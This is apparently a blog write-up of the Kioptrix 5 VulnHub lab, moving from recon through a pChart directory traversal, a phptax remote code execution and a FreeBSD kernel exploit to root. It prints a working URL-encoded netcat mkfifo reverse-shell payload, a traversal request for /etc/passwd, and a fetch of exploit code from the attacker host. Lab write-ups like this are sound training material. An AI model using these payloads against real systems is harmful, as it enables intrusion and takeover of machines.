---
title: "Kioptrix 5"
date: 2024-05-20
draft: false
summary: "Writeup for Kioptrix level 5 of the Kioptrix series challenge on VulnHub."
tags: ["kioptrix", "linux", "lfi", "directory traversal", "kernel exploit"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/kioptrix5/cover.webp"
  caption: "Kioptrix 5 VulnHub Challenge"
  alt: "Kioptrix 5 cover"
platform: "VulnHub"
---

This is the final level in the Kioptrix series and has the same goal as the rest - capture the flag present in the root directory by any means possible.
<!--more-->
You can download kioptrix level 5 by clicking on the link given below:
- https://www.vulnhub.com/entry/kioptrix-2014-5,62/

## Recon

I performed a network scan to find the IP of the target machine.

```bash
nmap -sn 192.168.1.0/24              
```

After identifying the target IP, I performed an **nmap** aggressive scan to find open ports and running services.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |
| 8080     | http        |

![](https://cdn.ziomsec.com/kioptrix5/1.webp)

## Initial Foothold

I tried fetching information about the application running on port 8080 but was forbidden.

```shell
curl http://TARGET:8080
```

![](https://cdn.ziomsec.com/kioptrix5/2.webp)

I fetched information about port 80 using **curl** and found an interesting path.

```shell
curl http://TARGET
```

![](https://cdn.ziomsec.com/kioptrix5/3.webp)

I accessed the path mentioned in the comment and got access to a charting application.

![](https://cdn.ziomsec.com/kioptrix5/4.webp)

Since the version of this application was available, I searched **Exploit-DB** for any exploits related to it.

```shell
searchsploit "pChart"
searchsploit -m php/webapps/31173.txt
```

![](https://cdn.ziomsec.com/kioptrix5/5.webp)

I found out that this particular version of the application was vulnerable to directory traversal.

![](https://cdn.ziomsec.com/kioptrix5/6.webp)

Hence, used the provided payload to read the contents of the */etc/passwd* file.

```
http://TARGET/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/passwd
```

![](https://cdn.ziomsec.com/kioptrix5/7.webp)

I then searched for the path where FreeBSD systems store Apache configuration files.

```
/usr/local/etc/apache22/httpd.conf
```

I accessed this file and found the reason why I was being denied on port 8080.

![](https://cdn.ziomsec.com/kioptrix5/8.webp)

![](https://cdn.ziomsec.com/kioptrix5/9.webp)

It required a specific user-agent. So I used **curl** to fetch information about that port by adding this user-agent.

```shell
curl http://TARGET:8080 -A "Mozilla/4.0 Mozilla4_browser"
```

![](https://cdn.ziomsec.com/kioptrix5/10.webp)

This had a directory listing and a link to "phptax". So I used **searchsploit** to look for exploits related to it.

>PHPtax is a free, open-source web application designed for managing and preparing tax documents. 

```shell
searchsplot "phptax"
```

![](https://cdn.ziomsec.com/kioptrix5/11.webp)

I tried the exploit available on Metasploit but it didn't work. So, I use alternative from Exploit DB to get a reverse shell using **netcat**:
- https://www.exploit-db.com/exploits/21665

I started an **nc** listener on port 4444.

```bash
rlwrap nc -lnvp 4444
```

I then configured a **netcat mkfifo** payload from **revshells**, URL encoded it and used it to get a reverse shell.
- https://www.revshells.com/

![](https://cdn.ziomsec.com/kioptrix5/12.webp)

```shell
curl http://TARGET:8080/phptax/drawimage.php?pfilez=1040d1-pg2.tob;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20KALI%20PORT%20%3E%2Ftmp%2Ff;&pdf=make -A "Mozilla/4.0 Mozilla4_browser"
```

![](https://cdn.ziomsec.com/kioptrix5/13.webp)

## Privilege Escalation

The flag was present in the *root* directory but I did not have the permissions to read it.

![](https://cdn.ziomsec.com/kioptrix5/14.webp)

I viewed the kernel information and searched for exploits related to it on **Exploit DB** using **searchsploit**.

```shell
uname -a
```

![](https://cdn.ziomsec.com/kioptrix5/15.webp)

```shell
searchsploit "FreeBSD 9.0"
```

![](https://cdn.ziomsec.com/kioptrix5/16.webp)

I downloaded the first exploit on the target.

```shell
fetch http://KALI/EXPLOIT
```

![](https://cdn.ziomsec.com/kioptrix5/17.webp)

After compiling it, I ran the exploit to get root access.

```shell
gcc EXPLOIT
./a.out
```

![](https://cdn.ziomsec.com/kioptrix5/18.webp)

Finally, I navigated to the root directory, fixed the permission of the flag and captured it.

```shell
cd root
chmod 777 congrats.txt
cat congrats.txt
```

![](https://cdn.ziomsec.com/kioptrix5/19.webp)

![](https://cdn.ziomsec.com/kioptrix5/20.webp)

## Closure

Here's a summary of how I pwned Kioptrix Level 5:
- I exploited the Directory Traversal vulnerability in the *pchart* page to get HTTP configuration information.
- This gave me a way to access the server on port 8080.
- I used the *phptax* RCE exploit to get a reverse shell from the server running on port 8080.
- I then used a kernel exploit to escalate my privilege.

That's it from my side.
Happy Hacking :)

---
